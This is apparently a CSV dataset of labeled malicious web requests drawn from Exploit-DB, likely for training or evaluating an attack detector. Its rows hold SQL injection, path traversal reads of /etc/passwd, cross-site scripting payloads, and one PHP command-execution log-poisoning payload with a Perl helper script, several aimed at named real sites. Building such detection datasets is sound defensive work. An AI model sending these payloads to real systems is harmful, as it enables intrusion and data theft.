"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_luongvd_002000","1","exploitdb","https://www.exploit-db.com/exploits/5664","GET","http://www.simpelside.dk/web3/index2.php?id=-3+union+select+1,concat_ws","/web3/index2.php","id=-3+union+select+1,concat_ws","[]","","http://www.simpelside.dk/web3/index2.php?id=-3+union+select+1,concat_ws","sqli"
"pos_luongvd_002001","1","exploitdb","https://www.exploit-db.com/exploits/5664","GET","http://www.simpelside.dk/web4/index2.php?id=-1+union+select+1,concat_ws","/web4/index2.php","id=-1+union+select+1,concat_ws","[]","","http://www.simpelside.dk/web4/index2.php?id=-1+union+select+1,concat_ws","sqli"
"pos_luongvd_002002","1","exploitdb","https://www.exploit-db.com/exploits/5654","GET","http://demo.fastfreemedia.com/play.php?id=-96969+union+select+0x28284d722e53514c2929,concat","/play.php","id=-96969+union+select+0x28284d722e53514c2929,concat","[]","","http://demo.fastfreemedia.com/play.php?id=-96969+union+select+0x28284d722e53514c2929,concat","sqli"
"pos_luongvd_002003","1","exploitdb","https://www.exploit-db.com/exploits/5647","GET","http://site.com/admin.php?show=../../../../../../../etc/passwd","/admin.php","show=../../../../../../../etc/passwd","[]","","http://site.com/admin.php?show=../../../../../../../etc/passwd","lfi"
"pos_luongvd_002004","1","exploitdb","https://www.exploit-db.com/exploits/5643","GET","http://site.com/?lang=../../../../../../../../../../../../../../etc/passwd%00","/","lang=../../../../../../../../../../../../../../etc/passwd%00","[]","","http://site.com/?lang=../../../../../../../../../../../../../../etc/passwd%00","lfi"
"pos_luongvd_002005","1","exploitdb","https://www.exploit-db.com/exploits/5610","GET","http://www.therealestatescript.com/demo/dpage.php?docID=-1+union+select+1,2,concat_ws","/demo/dpage.php","docID=-1+union+select+1,2,concat_ws","[]","","http://www.therealestatescript.com/demo/dpage.php?docID=-1+union+select+1,2,concat_ws","sqli"
"pos_luongvd_002006","1","exploitdb","https://www.exploit-db.com/exploits/5605","GET","http://www.xxx.com/e107_plugins/zogo-shop/products.php?cat=-1+union+select+database","/e107_plugins/zogo-shop/products.php","cat=-1+union+select+database","[]","","http://www.xxx.com/e107_plugins/zogo-shop/products.php?cat=-1+union+select+database","sqli"
"pos_luongvd_002007","1","exploitdb","https://www.exploit-db.com/exploits/5580","GET","http://www.exampel.com/gallery.php?gid=-9696'+UnIoN+SelecT+1,concat","/gallery.php","gid=-9696'+UnIoN+SelecT+1,concat","[]","","http://www.exampel.com/gallery.php?gid=-9696'+UnIoN+SelecT+1,concat","sqli"
"pos_luongvd_002008","1","exploitdb","https://www.exploit-db.com/exploits/5580","GET","http://www.exampel.com/gallery.php?gid=-9696'+union+select+1,concat","/gallery.php","gid=-9696'+union+select+1,concat","[]","","http://www.exampel.com/gallery.php?gid=-9696'+union+select+1,concat","sqli"
"pos_luongvd_002009","1","exploitdb","https://www.exploit-db.com/exploits/5555","GET","http://target/index.php?systemId=5'+union+select+1,2,concat_ws","/index.php","systemId=5'+union+select+1,2,concat_ws","[]","","http://target/index.php?systemId=5'+union+select+1,2,concat_ws","sqli"
"pos_luongvd_002010","1","exploitdb","https://www.exploit-db.com/exploits/5528","GET","http://Example/other/lite/admin.php?style=../../[FILE","/other/lite/admin.php","style=../../[FILE","[]","","http://Example/other/lite/admin.php?style=../../[FILE","lfi"
"pos_luongvd_002011","1","exploitdb","https://www.exploit-db.com/exploits/5509","GET","http://www.xxx.org/view.php?sid=-5926+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,unhex","/view.php","sid=-5926+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,unhex","[]","","http://www.xxx.org/view.php?sid=-5926+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,unhex","sqli"
"pos_luongvd_002012","1","exploitdb","https://www.exploit-db.com/exploits/5509","GET","http://www.xxx.org/view.php?sid=-3+union+select+1,2,3,unhex","/view.php","sid=-3+union+select+1,2,3,unhex","[]","","http://www.xxx.org/view.php?sid=-3+union+select+1,2,3,unhex","sqli"
"pos_luongvd_002013","1","exploitdb","https://www.exploit-db.com/exploits/5529","GET","http://example/include/global.inc.php?l=../../../[FILE","/include/global.inc.php","l=../../../[FILE","[]","","http://example/include/global.inc.php?l=../../../[FILE","lfi"
"pos_luongvd_002014","1","exploitdb","https://www.exploit-db.com/exploits/5487","GET","http://cogites.com/e_reserv/e_reserv/index.php?ID_loc=-1%20union%20select%20version","/e_reserv/e_reserv/index.php","ID_loc=-1%20union%20select%20version","[]","","http://cogites.com/e_reserv/e_reserv/index.php?ID_loc=-1%20union%20select%20version","sqli"
"pos_luongvd_002015","1","exploitdb","https://www.exploit-db.com/exploits/5469","GET","http://site.de/allmyguest/index.php?AMG_open=comments&AMG_id=null+UNION+SELECT+1,2,3,concat_ws","/allmyguest/index.php","AMG_open=comments&AMG_id=null+UNION+SELECT+1,2,3,concat_ws","[]","","http://site.de/allmyguest/index.php?AMG_open=comments&AMG_id=null+UNION+SELECT+1,2,3,concat_ws","sqli"
"pos_luongvd_002016","1","exploitdb","https://www.exploit-db.com/exploits/5454","GET","http://www.xxx.org//index.php?id=new&new=-1'%20UNION%20ALL%20SELECT%201,2,concat","//index.php","id=new&new=-1'%20UNION%20ALL%20SELECT%201,2,concat","[]","","http://www.xxx.org//index.php?id=new&new=-1'%20UNION%20ALL%20SELECT%201,2,concat","sqli"
"pos_luongvd_002017","1","exploitdb","https://www.exploit-db.com/exploits/5443","GET","http://www.xxx.co.il/index.php?content_id=-20'%20union%20select%20convert","/index.php","content_id=-20'%20union%20select%20convert","[]","","http://www.xxx.co.il/index.php?content_id=-20'%20union%20select%20convert","sqli"
"pos_luongvd_002018","1","exploitdb","https://www.exploit-db.com/exploits/5432","GET","http://www.xxx.org/view.php?id=-1+union+select+1,2,3,convert","/view.php","id=-1+union+select+1,2,3,convert","[]","","http://www.xxx.org/view.php?id=-1+union+select+1,2,3,convert","sqli"
"pos_luongvd_002019","1","exploitdb","https://www.exploit-db.com/exploits/5423","GET","http://site.com/prog/index.php?language=../../../../../../etc/passwd","/prog/index.php","language=../../../../../../etc/passwd","[]","","http://site.com/prog/index.php?language=../../../../../../etc/passwd","lfi"
"pos_luongvd_002020","1","exploitdb","https://www.exploit-db.com/exploits/5423","GET","http://site.com/prog/index.php?lang=../../../../../../etc/passwd","/prog/index.php","lang=../../../../../../etc/passwd","[]","","http://site.com/prog/index.php?lang=../../../../../../etc/passwd","lfi"
"pos_luongvd_002021","1","exploitdb","https://www.exploit-db.com/exploits/5428","GET","http://www.xxx.org/comment.php?ID=-67+union+select+concat","/comment.php","ID=-67+union+select+concat","[]","","http://www.xxx.org/comment.php?ID=-67+union+select+concat","sqli"
"pos_luongvd_002022","1","exploitdb","https://www.exploit-db.com/exploits/5382","GET","http://www.xxx.org/blog/index.php?categorie=-1+union+select+0,1,2,database","/blog/index.php","categorie=-1+union+select+0,1,2,database","[]","","http://www.xxx.org/blog/index.php?categorie=-1+union+select+0,1,2,database","sqli"
"pos_luongvd_002023","1","exploitdb","https://www.exploit-db.com/exploits/5377","GET","http://site.com/links.php?ax=list&sub=2&cat_id=-1%20UNION%20ALL%20SELECT%201,2,load_file","/links.php","ax=list&sub=2&cat_id=-1%20UNION%20ALL%20SELECT%201,2,load_file","[]","","http://site.com/links.php?ax=list&sub=2&cat_id=-1%20UNION%20ALL%20SELECT%201,2,load_file","sqli"
"pos_luongvd_002024","1","exploitdb","https://www.exploit-db.com/exploits/5352","GET","http://server.com/Path/index.php?mod=jeuxflash&cat=-1%20union%20select%201,concat","/Path/index.php","mod=jeuxflash&cat=-1%20union%20select%201,concat","[]","","http://server.com/Path/index.php?mod=jeuxflash&cat=-1%20union%20select%201,concat","sqli"
"pos_luongvd_002025","1","exploitdb","https://www.exploit-db.com/exploits/5333","GET","http://Sitename/dynamicpages/index.php?PageSection=7&page=individual&table=edp_Help_Internal_News&read=1+union+all+select+1,2,3,4,concat","/dynamicpages/index.php","PageSection=7&page=individual&table=edp_Help_Internal_News&read=1+union+all+select+1,2,3,4,concat","[]","","http://Sitename/dynamicpages/index.php?PageSection=7&page=individual&table=edp_Help_Internal_News&read=1+union+all+select+1,2,3,4,concat","sqli"
"pos_luongvd_002026","1","exploitdb","https://www.exploit-db.com/exploits/5333","GET","http://Sitename/admin/login.php?lang=/../../../../../../../../../../../../../../../etc/passwd%00","/admin/login.php","lang=/../../../../../../../../../../../../../../../etc/passwd%00","[]","","http://Sitename/admin/login.php?lang=/../../../../../../../../../../../../../../../etc/passwd%00","lfi"
"pos_luongvd_002027","1","exploitdb","https://www.exploit-db.com/exploits/5325","GET","https://www.jshopecommerce.com<?php echo '<start>'; echo system($_GET['cmd']); echo '</start>'; ?>","<","php echo '<start>'; echo system($_GET['cmd']); echo '</start>'; ?>","[[""Host"", ""www.jshopecommerce.com""]]","................................................................................................................
and simple parse the output of error log with lame perl script:

#!/usr/bin/env perl
use strict; use warnings;

#####################################
# This script download log file     #
# and grep the result of the        #
# command in tags <start>..</start> #
# and print it..                    #
#####################################

use LWP::UserAgent;
use HTTP::Request::Common;

$| = 1;

my $url = $ARGV[0] or print ""usage: $0 http://127.0.0.1/vuln.php?page=../../../../../var/log/access.log%00&cmd=ls+-lisa\n"" and exit;
my $ua= new LWP::UserAgent;
$ua->agent(""Mozilla/5.0"");
my $request = new HTTP::Request( 'GET' => $url );
my $document = $ua->request($request);
my $response = $document->as_string;
$response =~ m%<start>(.*?)</start>%is;
print $1,""\n"";

######################################

so dont waste your time and check it now
http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa

##########################################

# milw0rm.com [2008-03-30]","GET <?php echo '<start>'; echo system($_GET['cmd']); echo '</start>'; ?> HTTP/1.1
Host: www.jshopecommerce.com

................................................................................................................
and simple parse the output of error log with lame perl script:

#!/usr/bin/env perl
use strict; use warnings;

#####################################
# This script download log file     #
# and grep the result of the        #
# command in tags <start>..</start> #
# and print it..                    #
#####################################

use LWP::UserAgent;
use HTTP::Request::Common;

$| = 1;

my $url = $ARGV[0] or print ""usage: $0 http://127.0.0.1/vuln.php?page=../../../../../var/log/access.log%00&cmd=ls+-lisa\n"" and exit;
my $ua= new LWP::UserAgent;
$ua->agent(""Mozilla/5.0"");
my $request = new HTTP::Request( 'GET' => $url );
my $document = $ua->request($request);
my $response = $document->as_string;
$response =~ m%<start>(.*?)</start>%is;
print $1,""\n"";

######################################

so dont waste your time and check it now
http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa

##########################################

# milw0rm.com [2008-03-30]","lfi"
"pos_luongvd_002028","1","exploitdb","https://www.exploit-db.com/exploits/5325","GET","http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../../../../etc/passwd%00","/v2demo/page.php","xPage=../../../../../../../../../../../../../etc/passwd%00","[]","","http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../../../../etc/passwd%00","lfi"
"pos_luongvd_002029","1","exploitdb","https://www.exploit-db.com/exploits/5325","GET","http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa","/v2demo/page.php","xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa","[]","","http://www.jshopecommerce.com/v2demo/page.php?xPage=../../../../../../../../../../etc/httpd/logs/error_log%00&cmd=ls+-lisa","lfi"
"pos_luongvd_002030","1","exploitdb","https://www.exploit-db.com/exploits/5318","GET","http://www.akparti.org.tr/disiliskiler/index.php?option=com_myalbum&album=-1+union+select+0,concat","/disiliskiler/index.php","option=com_myalbum&album=-1+union+select+0,concat","[]","","http://www.akparti.org.tr/disiliskiler/index.php?option=com_myalbum&album=-1+union+select+0,concat","sqli"
"pos_luongvd_002031","1","exploitdb","https://www.exploit-db.com/exploits/5309","POST","/bolinos/system/actionspages/_b/contentFiles/gBLoginPage.php?bAddress=bolinos.sessions","/bolinos/system/actionspages/_b/contentFiles/gBLoginPage.php","bAddress=bolinos.sessions","[[""Content-Length"", ""81""], [""Content-Type"", ""application/x-www-form-urlencoded""], [""User-Agent"", ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; DS; .NET CLR 2.0.50727)""]]","formlogin=%27><img%20src%3d%22javascript:alert(%27DSecRG%20XSS%27)%22>&BtLogin.x=


3.2 Vulnerability found in page /help/index.php

POST parameter ""bolini_searchengine46Search"".

Example:

bolini_searchengine46Search = '><IMG SRC=javascript:alert(""DSecRG&#x20;XSS"")>

--------------------------------------------------------------------


4. System information disclosure

Non-authentication user can access phpinfo() page.

http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBphpInfo.php



About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:        research [at] dsec [dot] ru
                http://www.dsec.ru (in Russian)

# milw0rm.com [2008-03-25]","POST /bolinos/system/actionspages/_b/contentFiles/gBLoginPage.php?bAddress=bolinos.sessions HTTP/1.0
Content-Length: 81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; DS; .NET CLR 2.0.50727)

formlogin=%27><img%20src%3d%22javascript:alert(%27DSecRG%20XSS%27)%22>&BtLogin.x=


3.2 Vulnerability found in page /help/index.php

POST parameter ""bolini_searchengine46Search"".

Example:

bolini_searchengine46Search = '><IMG SRC=javascript:alert(""DSecRG&#x20;XSS"")>

--------------------------------------------------------------------


4. System information disclosure

Non-authentication user can access phpinfo() page.

http://[server]/[installdir]/system/actionspages/_b/contentFiles/gBphpInfo.php



About
*****

Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.


Contact:        research [at] dsec [dot] ru
                http://www.dsec.ru (in Russian)

# milw0rm.com [2008-03-25]","xss"
"pos_luongvd_002032","1","exploitdb","https://www.exploit-db.com/exploits/5222","GET","http://site.tld/path/qti_usr.php?id=4+UNION+ALL+SELECT+0,pwd,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+from+qtiuser+WHERE+id+=+1--","/path/qti_usr.php","id=4+UNION+ALL+SELECT+0,pwd,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+from+qtiuser+WHERE+id+=+1--","[]","","http://site.tld/path/qti_usr.php?id=4+UNION+ALL+SELECT+0,pwd,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22+from+qtiuser+WHERE+id+=+1--","sqli"
"pos_luongvd_002033","1","exploitdb","https://www.exploit-db.com/exploits/5195","GET","http://site.com/index.php?option=com_simpleboard&func=view&catid=-999+union+select+2,2,3,concat","/index.php","option=com_simpleboard&func=view&catid=-999+union+select+2,2,3,concat","[]","","http://site.com/index.php?option=com_simpleboard&func=view&catid=-999+union+select+2,2,3,concat","sqli"
"pos_luongvd_002034","1","exploitdb","https://www.exploit-db.com/exploits/5194","GET","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3Cscript%3Ealert","/wordpress/wp-content/plugins/sniplets/view/sniplets/warning.php","text=%3Cscript%3Ealert","[]","","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3Cscript%3Ealert","xss"
"pos_luongvd_002035","1","exploitdb","https://www.exploit-db.com/exploits/5194","GET","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/notice.php?text=%3Cscript%3Ealert","/wordpress/wp-content/plugins/sniplets/view/sniplets/notice.php","text=%3Cscript%3Ealert","[]","","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/notice.php?text=%3Cscript%3Ealert","xss"
"pos_luongvd_002036","1","exploitdb","https://www.exploit-db.com/exploits/5194","GET","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/inset.php?text=%3Cscript%3Ealert","/wordpress/wp-content/plugins/sniplets/view/sniplets/inset.php","text=%3Cscript%3Ealert","[]","","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/sniplets/inset.php?text=%3Cscript%3Ealert","xss"
"pos_luongvd_002037","1","exploitdb","https://www.exploit-db.com/exploits/5194","GET","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/admin/submenu.php?url=%22%3E%3Cscript%3Ealert","/wordpress/wp-content/plugins/sniplets/view/admin/submenu.php","url=%22%3E%3Cscript%3Ealert","[]","","http://victim.tld/wordpress/wp-content/plugins/sniplets/view/admin/submenu.php?url=%22%3E%3Cscript%3Ealert","xss"
